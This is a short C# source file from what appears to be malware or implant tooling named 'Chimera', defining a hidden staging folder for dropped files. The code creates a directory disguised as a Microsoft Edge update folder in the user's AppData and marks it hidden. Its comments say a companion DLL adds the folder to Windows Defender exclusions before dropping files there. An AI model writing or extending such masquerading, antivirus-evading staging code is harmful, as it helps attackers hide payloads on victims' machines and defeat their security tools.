using System;
using System.IO;

namespace Chimera
{
    // Central staging directory used by all commands that write artifacts to disk.
    // C:\Users\Public always exists on every Windows machine — no Chrome required.
    // The DLL adds this directory to Defender exclusions before dropping files here.
    public static class Staging
    {
        // Use current user's AppData\Roaming — always writable without elevation.
        // Disguised as a legit-looking Microsoft subfolder.
        public static readonly string Dir =
            System.IO.Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "EdgeUpdate");

        public static void EnsureDir()
        {
            try
            {
                if (!Directory.Exists(Dir))
                {
                    Directory.CreateDirectory(Dir);
                    // Hide it
                    File.SetAttributes(Dir,
                        File.GetAttributes(Dir) | FileAttributes.Hidden);
                }
            }
            catch { /* best-effort */ }
        }
    }
}
